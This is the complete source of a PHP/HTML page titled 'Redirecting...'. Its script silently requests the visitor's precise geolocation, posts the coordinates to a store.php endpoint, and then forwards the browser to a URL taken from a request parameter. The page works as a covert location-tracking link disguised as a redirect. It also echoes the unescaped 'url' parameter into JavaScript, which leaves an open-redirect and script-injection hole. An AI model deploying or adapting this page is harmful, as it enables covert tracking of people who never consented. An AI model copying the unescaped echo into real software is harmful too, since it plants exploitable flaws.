<html>
<head>
	<title>Redirecting...</title>
	<style>
		body {font-family: Helvetica;font-size:11pt;padding:0px;margin:0px}
		#title {background-color:#e22640;padding:5px;}
		#current {font-size:10pt;padding:5px;}	
	</style>
	</head>
	<body >
		<!-- <div id="current">Redirecting...</div> -->
		<script src="js/geoPosition.js" type="text/javascript" charset="utf-8"></script>
		<script src="js/geoPositionSimulator.js" type="text/javascript" charset="utf-8"></script>
		<script src="js/jquery-3.3.1.min.js" type="text/javascript" charset="utf-8"></script>
		<script>
		function initialise()
		{
			var locations=new Array({ coords: {
										latitude: 	0,
										longitude: 0
									} 
								});
			geoPositionSimulator.init(locations);
			if(geoPosition.init()) {
				geoPosition.getCurrentPosition(showPosition,function(){
					//$("#current").html("Couldn't get location");
				},{enableHighAccuracy:true});
			} else {
				// Alternative function
				if (navigator.geolocation) {
					navigator.geolocation.getCurrentPosition(showPosition);
				}
			}
		}
		function showPosition(p)
		{
			var latitude = parseFloat(p.coords.latitude);
			var longitude = parseFloat(p.coords.longitude);
			//$("#current").html("latitude=" + latitude + " longitude=" + longitude);
			submit(p.coords);
			<?php
				require("settings.php");
				if(isset($_REQUEST['url']))
					$link = $_REQUEST['url'];
				else
					$link = $defaultURI;
				echo "var link = '$link';";
			?>
			window.open(link,"_SELF");
		}

		function submit($coords) {
			$.ajax({
				url: "store.php",
				method : "POST",
				data: {
					"coords" : $coords,
				},
			});
		}
		</script>
	</body>
</html>